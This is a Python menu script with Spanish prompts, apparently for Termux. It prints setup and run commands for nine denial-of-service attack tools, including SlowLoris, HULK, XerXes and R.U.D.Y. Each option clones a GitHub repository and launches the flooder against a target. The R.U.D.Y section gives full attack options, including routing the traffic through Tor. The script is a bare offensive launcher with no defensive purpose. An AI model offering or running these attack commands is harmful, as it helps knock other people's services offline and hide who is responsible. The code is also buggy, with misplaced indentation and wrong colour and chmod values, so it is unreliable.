import os
import sys

RED = '\033[31m'
YELLOW = '\033[32m'
BLUE = '\033[33m'

os.system("clear")

print (BLUE+"""[1] DDoSjS""")
print ("""

[2] Hammer""")
print (RED+"""

[3] Planet""")
print (YELLOW+"""

[4] SlowLoris""")
print (BLUE+"""

[5] Riper""")
print (RED+"""

[6] R.U.D.Y""")
print (YELLOW+"""

[7] XerXes""")
print (BLUE+"""

[8] Hulk""")
print (RED+"""

[9] TorDDoS""")

opcion=input ("""Elije Una Opcion: """)
if opcion=="1":
    os.system("clear")
print ("""pkg install git

git clone https://github.com/jsh4ck/DDoS

cd DDoS

python ddosjs.py
    
IP:
PUERTO:""")
     
if opcion=="2":
    os.system("clear")
print ("""pkg install git
        
git clone https://github.com/rk1342k/Hammer

cd Hammer
    
python3 hammer.py""")

if opcion=="3":
    os.system("clear")
print ("""pkg install git
            
git clone https://github.com/Hydra7/Planetwork-DDOS
            
cd Planetwork-DDOS
            
python2 ./pntddos.py paquete de puerto IP""")

if opcion=="4":
    os.system("clear")
print ("""pkg install git
                
git clone https://github.com/gkbrk/slowloris.git

cd slowloris

python3 slowloris.py example.com""")

if opcion=="5":
    os.system("clear")
    print ("""pkg install git
                    
git clone https://github.com/palahsu/DDoS-Ripper

cd DDoS-Ripper $ ls

python3 DRipper.py""")

if opcion=="6":
 os.system("clear")
print ("""pkg install git
    
$ npm install -g rudyjs

$ rudy

Ejemplo de uso:

$ rudy -t "http://localhost:3000" -d 5 -n 500 --useTor --torUrl "127.0.0.1" --torPort 9051 -m "GET"
El -comando anterior ejecuta RUDY DDos Attack con 5 segundos de retraso &500 solicitudeshttp://localhost:3000

Opciones:

Mandar	Tipo	Predeterminado	Descripción
    
-t, --target (cadena)	Obligatorio	http://localhost:8080	Dirección URL de destino para atacar
    
-l, --length (número)	Opcional	1048576 Bytes (1 Mb)	Tamaño de la carga útil (bytes)
    
-n, --numberOfConnections (número)	Opcional	500	Número máximo de conexiones
    
-m, --method (cadena)	Opcional	EXPONER	Método de solicitud HTTP
    
-d, --delay (número)	Opcional	5 segundos	Retraso entre cada bytes enviados (segundos)
    
-v, --verbose	Opcional	falso	Habilitar registros detallados
    
-p, --useTor	Opcional	falso	Usar Tor Proxy
    
-u, --torUrl (cadena)	Opcional	127.0.0.1	URL personalizada del servidor Tor
    
-o, --torPort (número)	Opcional	9050	Puerto Tor personalizado
Generar carga útil:
    
$ rudy generatePayload <charCount>
    
Uso:

$ rudy generatePayload 2 """)

if opcion=="7":
    os.system("clear")
    print ("""pkg install git

pkg install clang

git clone https://github.com/ngrock90/xerxes
    
cd xerxes
    
chmod +x *
    
clang xerxes.c -o xerxes
    
./xerxes www.fakesite.com 80""")


if opcion=="8":
    os.system("clear")
    print ("""pkg install git
    
    git clone https://github.com/Mr4FX/HULK
    
    chmod x+ hulk.py
    
    python2 hulk.py""")

if opcion=="9":
    os.system("clear")
    print ("""pkg install git
    
git clone https://github.com/anonymousnm/tor-ddos
    
python torddos.py""")